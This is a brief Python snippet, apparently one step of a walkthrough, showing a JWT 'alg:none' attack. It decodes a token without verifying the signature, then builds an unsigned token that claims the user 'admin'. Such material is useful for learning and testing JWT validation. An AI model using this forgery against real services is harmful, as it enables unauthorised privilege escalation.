token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QifQ.abc"
data = jwt.decode(token, options={"verify_signature": False})
print(data)  # {"user": "guest"}

# Step 2: ลอง alg:none attack
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({"user":"admin"}).encode()).rstrip(b'=')
forged = f"{header.decode()}.{payload.decode()}."
print(forged)
